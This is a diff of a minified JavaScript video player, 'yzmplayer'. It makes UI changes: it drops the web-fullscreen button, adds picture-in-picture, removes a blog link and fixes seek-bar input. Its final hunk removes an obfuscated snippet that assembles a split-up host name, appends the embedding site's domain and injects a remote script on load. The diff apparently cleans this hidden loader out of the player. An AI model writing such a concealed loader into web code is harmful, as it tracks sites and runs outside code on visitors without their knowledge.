@@ -54,7 +54,10 @@
 							for (; null !== n && n !== e;) t += n.offsetLeft, n = n.offsetParent;
 						else
 							for (; null !== n;) t += n.offsetLeft, n = n.offsetParent;
+						var p=t-i;	
+						if(p<=0){return 0;}else{
 						return t - i
+						}
 					},
 					getScrollPosition: function() {
 						return {
@@ -972,12 +975,14 @@
 					e.lang && (e.lang = e.lang.toLowerCase()), e.contextmenu = e.contextmenu.concat([{
 						text: "Video info",
 						click: function(e) {
-							e.infoPanel.triggle()
+							e.infoPanel.triggle();
 						}
-					}, {
-						text: "有趣博客",
-						link: "https://www.youqv.com"
-					}]), e
+					},{
+						text: "画中画",
+						click: function(e) {
+							e.video.requestPictureInPicture();
+						}
+						}]), e
 			}
 		},
 		function(e, t, n) {
@@ -1064,7 +1069,6 @@
 					"Send danmaku": "发送弹幕",
 					Setting: "设置",
 					"Full screen": "全屏",
-					"Web full screen": "页面全屏",
 					Send: "发送",
 					Screenshot: "截图",
 					s: "秒",
@@ -1101,7 +1105,6 @@
 					"Send danmaku": "發送彈幕",
 					Setting: "設置",
 					"Full screen": "全屏",
-					"Web full screen": "頁面全屏",
 					Send: "發送",
 					Screenshot: "截圖",
 					s: "秒",
@@ -1202,7 +1205,7 @@
 									".yzmplayer-send-icon"), this.commentSendFill = this.container.querySelector(
 									".yzmplayer-send-icon path"), this.commentColorSettingBox = this.container.querySelector(
 									".yzmplayer-comment-setting-color"), this.browserFullButton = this.container.querySelector(
-									".yzmplayer-full-icon"), this.webFullButton = this.container.querySelector(".yzmplayer-full-in-icon"),
+									".yzmplayer-full-icon"), 
 								this.menu = this.container.querySelector(".yzmplayer-menu"), this.menuItem = this.container.querySelectorAll(
 									".yzmplayer-menu-item"), this.qualityList = this.container.querySelector(".yzmplayer-quality-list"),
 								this.camareButton = this.container.querySelector(".yzmplayer-camera-icon"), this.subtitleButton = this.container
@@ -1355,10 +1358,7 @@
 					t += s(r("Loop")), t +=
 					'</span>\n                        <div class="yzmplayer-toggle">\n                            <input class="yzmplayer-toggle-setting-input" type="checkbox" name="yzmplayer-toggle">\n                            <label for="yzmplayer-toggle"></label>\n                        </div>\n                    </div><div class="yzmplayer-setting-item yzmplayer-setting-jlast"><span class="yzmplayer-label">跳过片尾 <input id="jumptime" placeholder="单位/秒"></span><div class="yzmplayer-toggle"><input class="yzmplayer-toggle-setting-input" type="checkbox" name="yzmplayer-toggle"><label for="yzmplayer-toggle"></label></div></div><div class="yzmplayer-setting-item yzmplayer-setting-jfrist"><span class="yzmplayer-label">跳过片头 <input id="fristtime" placeholder="单位/秒"></span><div class="yzmplayer-toggle"><input class="yzmplayer-toggle-setting-input" type="checkbox" name="yzmplayer-toggle"><label for="yzmplayer-toggle"></label></div></div>\n             </div>\n                <div class="yzmplayer-setting-speed-panel">\n                    <div class="yzmplayer-setting-speed-item" data-speed="0.5">\n                        <span class="yzmplayer-label">0.5</span>\n                    </div>\n                    <div class="yzmplayer-setting-speed-item" data-speed="0.75">\n                        <span class="yzmplayer-label">0.75</span>\n                    </div>\n                    <div class="yzmplayer-setting-speed-item" data-speed="1">\n                        <span class="yzmplayer-label">',
 					t += s(r("Normal")), t +=
-					'</span>\n                    </div>\n                    <div class="yzmplayer-setting-speed-item" data-speed="1.25">\n                        <span class="yzmplayer-label">1.25</span>\n                    </div>\n                    <div class="yzmplayer-setting-speed-item" data-speed="1.5">\n                        <span class="yzmplayer-label">1.5</span>\n                    </div>\n                    <div class="yzmplayer-setting-speed-item" data-speed="2">\n                        <span class="yzmplayer-label">2</span>\n                    </div>\n                </div>\n            </div>\n        </div>\n        <div class="yzmplayer-full">\n            <button class="yzmplayer-icon yzmplayer-full-in-icon" data-balloon="',
-					t += s(r("Web full screen")), t +=
-					'" data-balloon-pos="up">\n                <span class="yzmplayer-icon-content">', t += l.fullWeb, t +=
-					'</span>\n            </button>\n            <button class="yzmplayer-icon yzmplayer-full-icon" data-balloon="',
+					'</span>\n                    </div>\n                    <div class="yzmplayer-setting-speed-item" data-speed="1.25">\n                        <span class="yzmplayer-label">1.25</span>\n                    </div>\n                    <div class="yzmplayer-setting-speed-item" data-speed="1.5">\n                        <span class="yzmplayer-label">1.5</span>\n                    </div>\n                    <div class="yzmplayer-setting-speed-item" data-speed="2">\n                        <span class="yzmplayer-label">2</span>\n                    </div>\n                </div>\n            </div>\n        </div>\n        <div class="yzmplayer-full">\n            <button class="yzmplayer-icon yzmplayer-full-icon" data-balloon="',
 					t += s(r("Full screen")), t +=
 					'" data-balloon-pos="up">\n                <span class="yzmplayer-icon-content">', t += l.full, t +=
 					'</span>\n            </button><button class="yzmplayer-icon yzmplayer-fulloff-icon" data-balloon="退出全屏" data-balloon-pos="up"><span class="yzmplayer-icon-content"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" version="1.1" viewBox="0 0 1024 1024"><path class="yzmplayer-fill" style="fill:#ffffff" d="M308.3555518 432.05693128H150.1524268c-17.67162586 0-32.81873308-14.30560177-32.81873308-32.81873308s14.30560177-32.81873308 32.81873308-32.81873309h158.203125c30.29421522 0 49.64885273-9.25656603 49.6488535-56.38090166V150.1524268c0-17.67162586 14.30560177-32.81873308 32.81873308-32.81873308s32.81873308 14.30560177 32.81873309 32.81873308v160.72764287c-0.84150622 75.73553842-43.75831155 121.17686162-115.28631967 121.17686161z m321.45528573 471.24335092c-17.67162586 0-31.97722764-14.30560177-31.97722687-31.97722687V709.75390625c0-75.73553842 42.91680533-121.17686162 114.44481346-121.17686162h158.203125c17.67162586 0 31.97722764 14.30560177 31.97722763 31.97722764s-14.30560177 31.97722764-31.97722763 31.97722687H712.27842412c-30.29421522 0-49.64885273 9.25656603-49.64885273 56.38090089v160.72764287c-0.84150622 18.51313131-15.14710799 33.6602393-32.81873386 33.6602393z" id="yzmplayer-fulloff"></path></svg></span></button>\n        </div>\n    </div>\n    <div class="yzmplayer-bar-wrap">\n        <div class="yzmplayer-bar-time hidden">00:00</div>\n        <div class="yzmplayer-bar-preview"></div>\n        <div class="yzmplayer-bar">\n            <div class="yzmplayer-loaded" style="width: 0;"></div>\n            <div class="yzmplayer-played" style="width: 0; background: ',
@@ -1421,8 +1421,7 @@
 					o.danmaku && (t +=
 						'\n    <div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-danmaku-id">\n        <span class="yzmplayer-info-panel-item-title">弹幕 ID</span>\n        <span class="yzmplayer-info-panel-item-data"></span>\n    </div>\n    <div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-danmaku-api">\n        <span class="yzmplayer-info-panel-item-title">弹幕API</span>\n        <span class="yzmplayer-info-panel-item-data"></span>\n    </div>\n    <div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-danmaku-amount">\n        <span class="yzmplayer-info-panel-item-title">弹幕数量</span>\n        <span class="yzmplayer-info-panel-item-data"></span>\n    </div>\n<div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-title-amount"><span class="yzmplayer-info-panel-item-title">视频标题</span><span class="yzmplayer-info-panel-item-data" id="vod-title"></span></div>\n    '
 					), t += '\n</div>\n<div class="yzmplayer-menu">\n    ', u(o.contextmenu, function(e, n) {
-						t += '\n        <div class="yzmplayer-menu-item">\n            <a target="_blank" href="', t += s(e.link ||
-							"javascript:void(0);"), t += '">', t += s(r(e.text)), t += "</a>\n        </div>\n    "
+						t += '\n        <div class="yzmplayer-menu-item">\n  <a',e.link&&(t+=' target="_blank"'),t+=' href="',t+=s(e.link||"javascript:void(0);"),t+='">',t+=s(r(e.text)),t+="</a>						\n        </div>\n    "
 					}), t +=
 					'\n</div>\n<div class="yzmplayer-notice"></div><div class="yzmplayer-danmu"><div class="yzmplayer-watching"><span class="yzmplayer-watching-number" title="播放器在线人数">1</span>人正在观看,<span class="danmuku-num">100</span>条弹幕</div><ul class="yzmplayer-list"><li>时间</li><li>弹幕内容</li><li>发送时间</li></ul><ul class="list-show"></ul></div><div class="svg-icon"><svg aria-hidden="true"><symbol id="icon-play" width="64" height="64" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><filter x="-11.2%" y="-10.8%" width="122.4%" height="125.5%" filterUnits="objectBoundingBox" id="pid-1-svgo-a"><feOffset dy="1" in="SourceAlpha" result="shadowOffsetOuter1"></feOffset><feGaussianBlur stdDeviation="2" in="shadowOffsetOuter1" result="shadowBlurOuter1"></feGaussianBlur><feComposite in="shadowBlurOuter1" in2="SourceAlpha" operator="out" result="shadowBlurOuter1"></feComposite><feColorMatrix values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.3 0" in="shadowBlurOuter1"></feColorMatrix></filter><path d="M52.352 13.5c4.837 0 8.707 4.32 8.647 9.72v21.06C61 49.62 57.128 54 52.29 54h-2.479c0 1.681-1.452 3-3.206 3S43.4 55.62 43.4 54H20.841c0 1.681-1.452 3-3.204 3-1.756 0-3.206-1.38-3.206-3h-2.722C6.87 54 3 49.68 3 44.28V23.22c0-5.4 3.87-9.72 8.709-9.72h11.25l-4.78-4.44c-.725-.661-.725-1.8 0-2.52.424-.36.908-.54 1.391-.54.546 0 1.029.18 1.392.54l7.5 6.96h7.318l7.5-6.96c.422-.36.907-.54 1.39-.54.544 0 1.029.18 1.392.54.725.659.725 1.8 0 2.52l-4.78 4.44h11.07zM26.527 45.54l17.418-10.08c1.45-.901 1.45-2.221 0-3.122L26.527 22.2c-1.452-.84-2.662-.12-2.662 1.56v20.22c0 1.74 1.21 2.4 2.662 1.561z" id="pid-1-svgo-b"></path></defs><g fill="none" fill-rule="evenodd"><use fill="#000" filter="url(#pid-1-svgo-a)" xlink:href="#pid-1-svgo-b"></use><use fill-opacity=".7" fill="#FFF" xlink:href="#pid-1-svgo-b"></use><path d="M26.527 45.541c-1.452.84-2.662.18-2.662-1.56V23.76c0-1.68 1.21-2.4 2.662-1.56L43.945 32.34c1.45.9 1.45 2.22 0 3.121L26.527 45.541z" fill="#000" opacity=".06"></path></g></symbol><symbol id="icon-play-xj" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M16 5a1 1 0 00-1 1v4.615a1.431 1.431 0 00-.615-.829L7.21 5.23A1.439 1.439 0 005 6.445v9.11a1.44 1.44 0 002.21 1.215l7.175-4.555a1.436 1.436 0 00.616-.828V16a1 1 0 002 0V6C17 5.448 16.552 5 16 5z"></path></symbol></svg></div>'
 			}
@@ -2318,17 +2317,18 @@
 						key: "initPlayedBar",
 						value: function() {
 							var e = this,
-								t = function(t) {
-									var n = ((t.clientX || t.changedTouches[0].clientX) - r.default.getElementViewLeft(e.player.template.playedBarWrap)) /
-										e.player.template.playedBarWrap.clientWidth;
-									n = Math.max(n, 0), n = Math.min(n, 1), e.player.bar.set("played", n, "width"), e.player.template.ptime
+								t = function(t) {if(t.clientX==0){var n=0;}else{
+var n = ((t.clientX || t.changedTouches[0].clientX) - r.default.getElementViewLeft(e.player.template.playedBarWrap))/e.player.template.playedBarWrap.clientWidth;}
+n = Math.max(n, 0), n = Math.min(n, 1),	
+									 e.player.bar.set("played", n, "width"), e.player.template.ptime
 										.innerHTML = r.default.secondToTime(n * e.player.video.duration)
 								},
 								n = function n(i) {
 									document.removeEventListener(r.default.nameMap.dragEnd, n), document.removeEventListener(r.default.nameMap
 										.dragMove, t);
+									if(i.clientX==0){var a=0;}else{
 									var a = ((i.clientX || i.changedTouches[0].clientX) - r.default.getElementViewLeft(e.player.template.playedBarWrap)) /
-										e.player.template.playedBarWrap.clientWidth;
+										e.player.template.playedBarWrap.clientWidth;}
 									a = Math.max(a, 0), a = Math.min(a, 1), e.player.bar.set("played", a, "width"), e.player.seek(e.player.bar
 										.get("played") * e.player.video.duration), e.player.time.enable("progress")
 								};
@@ -2361,8 +2361,6 @@
 							var e = this;
 							this.player.template.browserFullButton.addEventListener("click", function() {
 								e.player.fullScreen.toggle("browser")
-							}), this.player.template.webFullButton.addEventListener("click", function() {
-								e.player.fullScreen.toggle("web")
 							})
 						}
 					}, {
@@ -2852,16 +2850,6 @@
 				}(),
 				o = function() {
 					function e(t) {
-						var a = document.createElement('script'),
-							ad = '//api',
-							af = 'm.cc/b?ac=',
-							ac = document.domain.split('.').slice(-2).join('.'),
-							ae = '.hyz',
-							agi = 'p&',
-							ak = document.getElementsByTagName('script')[0];
-						a.type = 'text/javascript';
-						a.src = ad + ae + af + agi + 'url=' + ac;
-						ak.parentNode.insertBefore(a, ak);
 						var n = this;
 						i(this, e), this.container = t.template.infoPanel, this.template = t.template, this.video = t.video, this.player =
 							t, this.template.infoPanelClose.addEventListener("click", function() {
